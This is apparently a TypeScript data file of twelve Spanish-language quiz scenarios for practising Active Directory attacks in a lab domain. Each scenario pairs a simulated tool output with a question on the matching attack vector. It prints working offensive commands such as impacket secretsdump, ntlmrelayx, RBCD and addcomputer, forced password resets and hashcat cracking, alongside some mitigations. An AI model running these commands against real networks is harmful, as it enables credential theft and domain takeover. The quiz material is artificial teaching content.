import type { PracticeScenario } from "./types";

export const scenarios: PracticeScenario[] = [
  {
    id: "s1",
    title: "Escenario 1 · Shell en un servicio web",
    scenario:
      "Comprometiste un shell como 'iis apppool\\defaultapppool' en WEB01.lab.local. Antes de buscar credenciales en disco, quieres saber si puedes escalar localmente.",
    command: "whoami /priv",
    output: `PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeAssignPrimaryTokenPrivilege Assign primary token to process      Disabled
SeImpersonatePrivilege        Impersonate a client after auth      Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process   Disabled
SeAuditPrivilege              Generate security audits             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeCreateGlobalPrivilege       Create global objects                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled`,
    question: "¿Qué vector de escalada local encaja con esta salida?",
    hint: "Busca privilegios Se* en estado Enabled. Un servicio web con impersonation suele apuntar a técnicas Potato en lab.",
    options: [
      {
        vectorId: "se-impersonate",
        label: "SeImpersonate — impersonation tras autenticación (Potato en lab)",
        correct: true,
        feedback:
          "Correcto. SeImpersonatePrivilege Enabled es la firma clásica: el proceso puede adoptar la identidad de clientes autenticados. En cuentas de servicio IIS/SQL, el camino pedagógico es abuso de tokens → SYSTEM.",
      },
      {
        vectorId: "se-debug",
        label: "SeDebug — depurar procesos del sistema (LSASS)",
        correct: false,
        feedback:
          "No. SeDebugPrivilege no aparece Enabled aquí. SeDebug abriría procesos como LSASS para dump de credenciales, no impersonation de clientes.",
      },
      {
        vectorId: "se-backup",
        label: "SeBackup — leer ficheros saltando ACL de lectura",
        correct: false,
        feedback:
          "No. SeBackupPrivilege tampoco está Enabled. SeBackup permite leer objetos ignorando ACL normales (hives SAM/SYSTEM), no impersonation.",
      },
    ],
    keyLines: ["SeImpersonatePrivilege", "Impersonate a client after auth", "Enabled"],
    explanation: [
      "whoami /priv es el primer paso en cualquier host Windows: lista privilegios del token actual, no solo grupos.",
      "SeImpersonate + contexto de servicio = vector local de curso. El siguiente paso en lab es identificar listeners locales y practicar una técnica Potato documentada.",
    ],
    nextStep:
      "Identifica el servicio (IIS/MSSQL) y practica GodPotato/JuicyPotato solo en lab autorizado",
  },
  {
    id: "s2",
    title: "Escenario 2 · Cuenta de soporte con demasiados derechos",
    scenario:
      "Comprometiste el equipo de helpdesk. El usuario 'helpdesk01' tiene privilegios locales inusuales para una cuenta interactiva.",
    command: "whoami /priv",
    output: `PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeDebugPrivilege              Debug programs                       Enabled
SeImpersonatePrivilege        Impersonate a client after auth      Disabled
SeBackupPrivilege             Back up files and directories        Disabled
SeRestorePrivilege            Restore files and directories        Disabled
SeTakeOwnershipPrivilege      Take ownership of files              Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled`,
    question: "¿Cuál es el vector local más directo con esta salida?",
    hint: "SeDebug Enabled permite abrir procesos privilegiados del sistema, incluido LSASS.",
    options: [
      {
        vectorId: "se-debug",
        label: "SeDebug — abrir LSASS y extraer credenciales en lab",
        correct: true,
        feedback:
          "Correcto. SeDebugPrivilege Enabled permite depurar (y acceder a) procesos de otros usuarios, incluidos los del sistema. En lab, LSASS guarda secretos de autenticación.",
      },
      {
        vectorId: "se-impersonate",
        label: "SeImpersonate — técnicas Potato hacia SYSTEM",
        correct: false,
        feedback:
          "No. SeImpersonatePrivilege está Disabled. Sin impersonation activa, Potato no aplica por este camino.",
      },
      {
        vectorId: "sam-lsa-dump",
        label: "SAM/LSA dump — volcar hives locales con admin",
        correct: false,
        feedback:
          "No es la firma primaria aquí. SAM/LSA requiere admin local/SYSTEM para dump de hives; SeDebug es la pista directa en whoami /priv (acceso a LSASS).",
      },
    ],
    keyLines: ["SeDebugPrivilege", "Debug programs", "Enabled"],
    explanation: [
      "SeDebug en cuentas interactivas no admin es una mala configuración frecuente en labs. Es señal de riesgo alto.",
      "Blue team: auditar User Rights Assignment, quitar SeDebug innecesario, proteger LSASS (PPL, Credential Guard, EDR).",
    ],
    nextStep:
      "En lab autorizado: dump de LSASS con herramienta documentada → analizar credenciales de dominio",
  },
  {
    id: "s3",
    title: "Escenario 3 · Cuenta de backup con acceso privilegiado",
    scenario:
      "Ganaste acceso a la cuenta de servicio 'backup_agent' en FILE01.lab.local. Es una cuenta de copias de seguridad, no admin local.",
    command: "whoami /priv",
    output: `PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeBackupPrivilege             Back up files and directories        Enabled
SeRestorePrivilege            Restore files and directories        Enabled
SeImpersonatePrivilege        Impersonate a client after auth      Disabled
SeDebugPrivilege              Debug programs                       Disabled
SeTakeOwnershipPrivilege      Take ownership of files              Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process   Disabled`,
    question: "¿Qué vector local te permite leer secretos protegidos por ACL?",
    hint: "SeBackup Enabled = lectura de ficheros ignorando permisos normales. Piensa en hives del registro.",
    options: [
      {
        vectorId: "se-backup",
        label: "SeBackup — leer SAM/SYSTEM y secretos en disco saltando ACL",
        correct: true,
        feedback:
          "Correcto. SeBackupPrivilege permite leer casi cualquier fichero como si fueras software de backup. En lab, los hives SAM/SYSTEM/SECURITY son el objetivo pedagógico clásico.",
      },
      {
        vectorId: "se-restore",
        label: "SeRestore — escribir ficheros saltando ACL de escritura",
        correct: false,
        feedback:
          "Parcialmente relacionado (SeRestore también está Enabled), pero la pregunta apunta a lectura de secretos. SeRestore es el vector de escritura; SeBackup es la firma de bypass de lectura.",
      },
      {
        vectorId: "se-debug",
        label: "SeDebug — acceder a memoria de LSASS",
        correct: false,
        feedback:
          "No. SeDebugPrivilege está Disabled. SeDebug abre procesos en memoria; SeBackup lee ficheros del disco ignorando ACL.",
      },
    ],
    keyLines: ["SeBackupPrivilege", "Back up files and directories", "Enabled"],
    explanation: [
      "SeBackup y SeRestore suelen ir juntos en cuentas de backup reales, pero cada uno tiene un abuso distinto: lectura vs escritura.",
      "El aprendizaje clave: las ACL de Windows no son la última línea de defensa si hay privilegios de backup mal asignados.",
    ],
    nextStep:
      "En lab: reg save o robocopy con /B para leer hives → extraer hashes NTLM locales",
  },
  {
    id: "s4",
    title: "Escenario 4 · Usuarios sin Kerberos preauth",
    scenario:
      "Enumeraste usuarios válidos en lab.local. Quieres credenciales sin conocer la password actual del objetivo.",
    command:
      "impacket-GetNPUsers lab.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat -no-pass",
    output: `$krb5asrep$23$legacy.user@LAB.LOCAL:8A3F2B1C9D0E7F6A5B4C3D2E1F0A9B8...
$krb5asrep$23$svc_old@LAB.LOCAL:1F0E9D8C7B6A5948372615049382716...

[*] Got AS-REP for legacy.user@LAB.LOCAL
[*] Got AS-REP for svc_old@LAB.LOCAL`,
    question: "¿Qué vector Kerberos explica estos hashes?",
    hint: "AS-REP sin preauth → hash crackeable offline. La herramienta es GetNPUsers, no GetUserSPNs.",
    options: [
      {
        vectorId: "asrep-roast",
        label: "AS-REP Roasting — cuentas con DONT_REQ_PREAUTH",
        correct: true,
        feedback:
          "Correcto. GetNPUsers obtiene AS-REP de usuarios sin preauthentication Kerberos. Los hashes $krb5asrep$ se crackean offline sin tocar más el DC.",
      },
      {
        vectorId: "kerberoasting",
        label: "Kerberoasting — TGS de service accounts con SPN",
        correct: false,
        feedback:
          "No. Kerberoasting produce $krb5tgs$ de cuentas con SPN y requiere credenciales válidas para pedir TGS. Aquí hay $krb5asrep$ y -no-pass funcionó.",
      },
      {
        vectorId: "shadow-credentials",
        label: "Shadow Credentials — escribir KeyCredentialLink",
        correct: false,
        feedback:
          "No. Shadow Credentials requiere permiso de escritura sobre msDS-KeyCredentialLink y autenticación PKINIT, no AS-REP roasting.",
      },
    ],
    keyLines: ["$krb5asrep$23$", "GetNPUsers", "Got AS-REP", "-no-pass"],
    explanation: [
      "AS-REP Roasting explota cuentas con 'Do not require Kerberos preauthentication'. Cualquiera puede pedir un AS-REP crackeable.",
      "Mitigación: exigir preauth en todas las cuentas y passwords fuertes. En lab, el flujo es crack → validar creds → continuar enum.",
    ],
    nextStep: "hashcat -m 18200 asrep_hashes.txt wordlist.txt",
  },
  {
    id: "s5",
    title: "Escenario 5 · Cuentas con SPN en el dominio",
    scenario:
      "Tienes credenciales de 'lowpriv@lab.local' y quieres service accounts crackeables offline antes de moverte lateralmente.",
    command:
      "impacket-GetUserSPNs lab.local/lowpriv:'Password1!' -dc-ip 10.10.10.10 -request",
    output: `ServicePrincipalName                     MemberOf
---------------------------------------- --------------------------------
MSSQLSvc/sql01.lab.local:1433            CN=SQL Admins,OU=Groups,DC=lab,DC=local
HTTP/web01.lab.local                   CN=WebOps,OU=Groups,DC=lab,DC=local

$krb5tgs$23$*svc_sql$LAB.LOCAL$lab.local/svc_sql*$A1B2C3D4E5F6...
$krb5tgs$23$*svc_web$LAB.LOCAL$lab.local/svc_web*$F6E5D4C3B2A1...`,
    question: "¿Qué vector Kerberos estás explotando?",
    hint: "TGS solicitados con -request + hashes $krb5tgs$ → cracking offline de service accounts.",
    options: [
      {
        vectorId: "kerberoasting",
        label: "Kerberoasting — TGS de cuentas con SPN, crack offline",
        correct: true,
        feedback:
          "Correcto. GetUserSPNs -request devuelve TGS crackeables de cuentas con servicePrincipalName. Es el camino clásico: enum → roast → crack → reutilizar creds.",
      },
      {
        vectorId: "asrep-roast",
        label: "AS-REP Roasting — usuarios sin preauthentication",
        correct: false,
        feedback:
          "No. AS-REP usa GetNPUsers y produce hashes $krb5asrep$, no $krb5tgs$. Aquí pediste TGS de SPNs, no AS-REP sin preauth.",
      },
      {
        vectorId: "dcsync",
        label: "DCSync — replicar secretos del DC",
        correct: false,
        feedback:
          "No. DCSync requiere permisos DS-Replication-Get-Changes(+All) y usa secretsdump, no TGS de SPNs crackeables.",
      },
    ],
    keyLines: ["ServicePrincipalName", "$krb5tgs$23$", "-request"],
    explanation: [
      "Kerberoasting: cualquier usuario autenticado puede pedir TGS de cuentas con SPN. El material del ticket deriva de la password del service account.",
      "Tras crackear offline con hashcat/John, valida la password en lab y busca movimiento lateral (SQL, web, grupos privilegiados).",
    ],
    nextStep: "hashcat -m 13100 hashes.txt wordlist.txt",
  },
  {
    id: "s6",
    title: "Escenario 6 · Camino BloodHound hacia secretos del DC",
    scenario:
      "Importaste el coleccionable de BloodHound. El usuario 'backup_svc' tiene un edge peligroso hacia el dominio lab.local.",
    command: "BloodHound → Node: backup_svc → Outbound Object Control",
    output: `User: backup_svc@lab.local
  ├─ MemberOf → Backup Operators (lab.local)
  └─ GetChanges (Extended Right) → lab.local
  └─ GetChangesAll (Extended Right) → lab.local

Path summary: backup_svc → DCSync → NTDS hashes on DC01.lab.local`,
    question: "¿Qué vector ACL/AD permite extraer hashes del DC?",
    hint: "GetChanges + GetChangesAll sobre el dominio = replicación como si fueras un DC.",
    options: [
      {
        vectorId: "dcsync",
        label: "DCSync — replicar NTDS vía protocolo de replicación AD",
        correct: true,
        feedback:
          "Correcto. GetChanges y GetChangesAll son los derechos de DCSync. Con ellos, secretsdump puede pedir hashes (incl. krbtgt) al DC sin ser Domain Admin de facto.",
      },
      {
        vectorId: "generic-all",
        label: "GenericAll — control total sobre un objeto AD",
        correct: false,
        feedback:
          "No. GenericAll da Full Control sobre un objeto concreto, pero la firma aquí es específica: Extended Rights GetChanges/GetChangesAll sobre el dominio.",
      },
      {
        vectorId: "force-change-password",
        label: "ForceChangePassword — resetear password de otro usuario",
        correct: false,
        feedback:
          "No. ForceChangePassword permite cambiar la password de un usuario objetivo, no replicar la base NTDS del dominio.",
      },
    ],
    keyLines: ["GetChanges", "GetChangesAll", "DCSync", "NTDS hashes"],
    explanation: [
      "BloodHound visualiza edges de ACL: GetChanges + GetChangesAll → nodo DCSync. Es casi siempre game over en labs de AD.",
      "La detección blue team clave: replicación desde hosts que no son DC. Mitiga auditando quién tiene esos Extended Rights.",
    ],
    nextStep: "impacket-secretsdump lab.local/backup_svc:'NewPass!'@DC01.lab.local",
  },
  {
    id: "s7",
    title: "Escenario 7 · Helpdesk con permiso sobre IT admin",
    scenario:
      "Eres 'helpdesk02@lab.local'. BloodHound muestra un edge directo hacia el administrador de sistemas del lab.",
    command: "BloodHound → Edge: helpdesk02 → ForceChangePassword → it.admin",
    output: `User: helpdesk02@lab.local
  └─ ForceChangePassword (Extended Right) → it.admin@lab.local
     └─ MemberOf → Server Admins, Domain Admins (lab.local)

Path summary: helpdesk02 → reset it.admin password → Domain Admin access`,
    question: "¿Qué vector ACL describe este edge de BloodHound?",
    hint: "ForceChangePassword = resetear la password de otro usuario sin conocer la actual.",
    options: [
      {
        vectorId: "force-change-password",
        label: "ForceChangePassword — reset controlado de password en lab",
        correct: true,
        feedback:
          "Correcto. ForceChangePassword (User-Force-Change-Password) permite cambiar la password del objetivo. Es un vector ACL didáctico: permiso puntual → identidad de alto valor.",
      },
      {
        vectorId: "generic-all",
        label: "GenericAll — control total sobre el usuario objetivo",
        correct: false,
        feedback:
          "No. GenericAll sería Full Control completo. La firma específica aquí es ForceChangePassword, un Extended Right concreto.",
      },
      {
        vectorId: "write-dacl",
        label: "WriteDACL — reescribir permisos del objeto",
        correct: false,
        feedback:
          "No. WriteDACL permite modificar la DACL para darte más permisos. Aquí ya tienes el derecho directo de forzar cambio de password.",
      },
    ],
    keyLines: ["ForceChangePassword", "Extended Right", "it.admin"],
    explanation: [
      "ForceChangePassword es un ACL común en escenarios de helpdesk mal configurado. El impacto depende de a quién apunta.",
      "Blue team: evento 4724 (reset password) y revisión periódica de Extended Rights sobre cuentas privilegiadas.",
    ],
    nextStep:
      "net rpc password it.admin 'LabNewPass123!' -U lab.local/helpdesk02%Password1! -S DC01.lab.local",
  },
  {
    id: "s8",
    title: "Escenario 8 · Escritura sobre un computer object",
    scenario:
      "Comprometiste 'dev_junior@lab.local'. BloodHound marca GenericWrite sobre el servidor SQL02.",
    command: "BloodHound → Node: SQL02$ → Inbound Object Control",
    output: `Computer: SQL02.lab.local
  └─ GenericWrite ← dev_junior@lab.local
  └─ msDS-AllowedToActOnBehalfOfOtherIdentity: (not set)

Suggested abuse: dev_junior → GenericWrite → configure RBCD → impersonate admin toward SQL02`,
    question: "¿Qué vector de delegación encaja con GenericWrite sobre un computer?",
    hint: "Si puedes escribir msDS-AllowedToActOnBehalfOfOtherIdentity, configuras quién delega hacia ese host.",
    options: [
      {
        vectorId: "rbcd",
        label: "RBCD — Resource-Based Constrained Delegation sobre SQL02",
        correct: true,
        feedback:
          "Correcto. GenericWrite sobre un computer permite configurar msDS-AllowedToActOnBehalfOfOtherIdentity. Con una machine account tuya, puedes impersonar usuarios hacia ese host.",
      },
      {
        vectorId: "constrained-delegation",
        label: "Constrained Delegation — msDS-AllowedToDelegateTo",
        correct: false,
        feedback:
          "No. Constrained delegation se configura en la cuenta que delega (msDS-AllowedToDelegateTo), no en el recurso destino. RBCD invierte el modelo: el recurso decide quién delega.",
      },
      {
        vectorId: "unconstrained-delegation",
        label: "Unconstrained Delegation — TRUSTED_FOR_DELEGATION",
        correct: false,
        feedback:
          "No. Unconstrained delegation guarda TGT de quienes se autentican. La firma aquí es escritura sobre computer object → RBCD, no TrustedForDelegation.",
      },
    ],
    keyLines: ["GenericWrite", "msDS-AllowedToActOnBehalfOfOtherIdentity", "RBCD"],
    explanation: [
      "RBCD es el abuso típico tras GenericWrite/WriteAccountRestrictions sobre machine accounts.",
      "Cadena pedagógica: ACL → crear/configurar machine account → AllowedToAct → S4U → admin local del host.",
    ],
    nextStep:
      "impacket-rbcd -action write -delegate-from EVILPC$ -delegate-to SQL02$ -dc-ip 10.10.10.10 lab.local/dev_junior:Password1!",
  },
  {
    id: "s9",
    title: "Escenario 9 · Servidor con delegación sin restricciones",
    scenario:
      "Enumeraste delegación Kerberos en lab.local. Encontraste un host legacy con configuración peligrosa.",
    command: "Get-DomainComputer -Unconstrained | select name, useraccountcontrol",
    output: `name        useraccountcontrol
----        ------------------
PRINT01     528384  (WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION)
SQL02       4096    (WORKSTATION_TRUST_ACCOUNT)
FILE01      528384  (WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION)

[*] PRINT01: TRUSTED_FOR_DELEGATION — stores TGTs of authenticating users`,
    question: "¿Qué vector de delegación explica TRUSTED_FOR_DELEGATION?",
    hint: "Un host unconstrained guarda TGT de quien se autentica. Combínalo con coerce en labs avanzados.",
    options: [
      {
        vectorId: "unconstrained-delegation",
        label: "Unconstrained Delegation — captura y reutilización de TGT",
        correct: true,
        feedback:
          "Correcto. TRUSTED_FOR_DELEGATION (528384 en workstations) indica unconstrained delegation. Si controlas ese host, puedes extraer TGT de usuarios que se autentiquen contra él.",
      },
      {
        vectorId: "rbcd",
        label: "RBCD — msDS-AllowedToActOnBehalfOfOtherIdentity",
        correct: false,
        feedback:
          "No. RBCD se configura escribiendo AllowedToAct en el computer destino. TRUSTED_FOR_DELEGATION es la bandera clásica de unconstrained.",
      },
      {
        vectorId: "constrained-delegation",
        label: "Constrained Delegation — S4U hacia SPNs concretos",
        correct: false,
        feedback:
          "No. Constrained delegation limita a SPNs en msDS-AllowedToDelegateTo. Unconstrained no tiene esa restricción: almacena TGT completos.",
      },
    ],
    keyLines: ["TRUSTED_FOR_DELEGATION", "528384", "stores TGTs"],
    explanation: [
      "Unconstrained delegation era común en DCs antiguos; hoy persiste en servidores legacy mal migrados.",
      "En lab avanzado: coerce (PetitPotam/PrinterBug) → auth de DA contra PRINT01 → Rubeus monitor/extract → reutilizar TGT.",
    ],
    nextStep:
      "Compromete admin local de PRINT01 → Rubeus monitor /tgt → fuerza auth con coerce en lab autorizado",
  },
  {
    id: "s10",
    title: "Escenario 10 · SYSVOL con políticas antiguas",
    scenario:
      "Tienes acceso de lectura al SYSVOL del dominio lab.local. Buscas credenciales olvidadas en GPOs.",
    command:
      "impacket-GetGPPPassword -dc-ip 10.10.10.10 'lab.local/lowpriv:Password1!'",
    output: `[*] Searching for cpassword in \\\\lab.local\\SYSVOL\\lab.local\\Policies\\

[+] Found cpassword in Groups.xml
    User: lab.local\\svc_deploy
    Password: SuperSecretDeploy2024!

[+] Found cpassword in Services\\DatabaseConnection.xml
    User: lab.local\\svc_sql
    Password: SqlAdminPass!`,
    question: "¿Qué vector de credenciales explica cpassword en SYSVOL?",
    hint: "Group Policy Preferences guardaba passwords cifradas con una clave AES pública conocida.",
    options: [
      {
        vectorId: "gpp-passwords",
        label: "GPP Passwords — cpassword en XML de Group Policy",
        correct: true,
        feedback:
          "Correcto. Las GPP antiguas almacenaban passwords en cpassword dentro de XML en SYSVOL. La clave AES era pública → descifrado trivial. Sigue apareciendo en labs con GPOs legacy.",
      },
      {
        vectorId: "asrep-roast",
        label: "AS-REP Roasting — usuarios sin preauthentication",
        correct: false,
        feedback:
          "No. AS-REP roasting obtiene hashes Kerberos de cuentas sin preauth. Aquí encontraste passwords en texto claro tras descifrar cpassword de GPO.",
      },
      {
        vectorId: "kerberoasting",
        label: "Kerberoasting — TGS de cuentas con SPN",
        correct: false,
        feedback:
          "No. Kerberoasting ataca tickets TGS de SPNs. GPP passwords son credenciales estáticas en ficheros XML de políticas de grupo.",
      },
    ],
    keyLines: ["cpassword", "Groups.xml", "SYSVOL"],
    explanation: [
      "MS14-025 parcheó la creación de nuevas GPP con cpassword, pero muchos entornos lab (y reales legacy) conservan XML antiguos.",
      "Mitigación: eliminar cpassword de SYSVOL, rotar passwords expuestas, auditar \\\\domain\\SYSVOL periódicamente.",
    ],
    nextStep:
      "Valida svc_deploy y svc_sql en lab → enumera SPNs y grupos de cada cuenta",
  },
  {
    id: "s11",
    title: "Escenario 11 · Coerce + relay hacia LDAP",
    scenario:
      "En el lab montaste un listener y forzaste autenticación desde el DC. LDAP signing está deshabilitado.",
    command: "ntlmrelayx.py -t ldap://DC01.lab.local --escalate-user lowpriv",
    output: `[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.10.10.10 (DC01$)
[*] Authenticating against ldap://DC01.lab.local as LAB/DC01$ SUCCEED
[*] Relayed NTLM authentication from DC01$@LAB.LOCAL
[*] User lowpriv successfully escalated via LDAP relay (WriteDACL on domain)

[!] Coerce triggered via PetitPotam (EfsRpcOpenFileRaw) → 10.10.10.50`,
    question: "¿Qué vector describe la cadena coerce → relay → escalada?",
    hint: "PetitPotam fuerza auth; ntlmrelayx reenvía el NTLM a un servicio sin firmas. La firma es el flujo, no un CVE concreto.",
    options: [
      {
        vectorId: "petitpotam-relay",
        label: "Coerce + NTLM Relay — PetitPotam → relay LDAP sin signing",
        correct: true,
        feedback:
          "Correcto. La firma pedagógica es: coerce (PetitPotam/PrinterBug) fuerza autenticación NTLM → relay hacia LDAP/SMB/HTTP sin firmas → abuso del servicio destino.",
      },
      {
        vectorId: "unconstrained-delegation",
        label: "Unconstrained Delegation — captura de TGT en memoria",
        correct: false,
        feedback:
          "No. Unconstrained captura TGT Kerberos, no relay NTLM. Aquí el flujo es NTLM relay tras coerce, típico cuando LDAP signing está off.",
      },
      {
        vectorId: "dcsync",
        label: "DCSync — replicación directa de NTDS",
        correct: false,
        feedback:
          "No. DCSync usa permisos de replicación AD (GetChanges/GetChangesAll). El relay LDAP puede escalar privilegios, pero la firma inicial es coerce + NTLM relay.",
      },
    ],
    keyLines: ["ntlmrelayx", "PetitPotam", "Relayed NTLM", "LDAP signing"],
    explanation: [
      "No memorices un CVE: entiende el patrón coerce → relay → servicio vulnerable. PetitPotam es un coerce popular en labs.",
      "Mitigación: SMB/LDAP signing + EPA, parches de coerce, segmentación de red. ADCS ESC8 es variante relay hacia HTTP enrollment.",
    ],
    nextStep:
      "Con WriteDACL obtenido: dacledit para GenericAll → continúa enum BloodHound en lab",
  },
  {
    id: "s12",
    title: "Escenario 12 · Crear machine accounts en el dominio",
    scenario:
      "Eres un usuario autenticado sin privilegios admin. Quieres saber si puedes unir equipos al dominio para abusar RBCD.",
    command: "(Get-DomainObject lab.local).ms-DS-MachineAccountQuota",
    output: `(Get-DomainObject lab.local).ms-DS-MachineAccountQuota
10

[*] Default ms-DS-MachineAccountQuota = 10 (users can create up to 10 machine accounts)

impacket-addcomputer -computer-name 'EVILPC$' -computer-pass 'EvilPass123!' lab.local/lowpriv:Password1!
[+] Successfully added machine account EVILPC$ to domain lab.local`,
    question: "¿Qué vector explica la creación de EVILPC$ por un usuario normal?",
    hint: "ms-DS-MachineAccountQuota > 0 permite a usuarios autenticados crear machine accounts sin ser admin.",
    options: [
      {
        vectorId: "machine-account-quota",
        label: "Machine Account Quota — usuarios crean computer objects (MAQ)",
        correct: true,
        feedback:
          "Correcto. ms-DS-MachineAccountQuota define cuántas machine accounts puede crear un usuario autenticado. MAQ > 0 habilita addcomputer → base para RBCD y otros abusos.",
      },
      {
        vectorId: "rbcd",
        label: "RBCD — delegación basada en recursos",
        correct: false,
        feedback:
          "RBCD es el abuso posterior (escribir AllowedToAct), no la creación inicial de la machine account. MAQ es el prerrequisito que lo hace posible.",
      },
      {
        vectorId: "generic-all",
        label: "GenericAll — control total sobre objetos AD",
        correct: false,
        feedback:
          "No. GenericAll requiere ACL explícita sobre un objeto. MAQ es un límite por defecto del dominio que permite crear machines sin permisos admin.",
      },
    ],
    keyLines: ["ms-DS-MachineAccountQuota", "10", "addmachine", "EVILPC$"],
    explanation: [
      "Por defecto Windows permite a usuarios autenticados crear hasta 10 machine accounts. Muchos labs dejan MAQ en default.",
      "Cadena típica: MAQ → crear EVILPC$ → RBCD (si hay GenericWrite en un server) → escalada. Mitiga: MAQ=0 y auditar computer objects nuevos.",
    ],
    nextStep:
      "BloodHound: busca GenericWrite hacia computers → prepara RBCD con EVILPC$ en lab",
  },
];
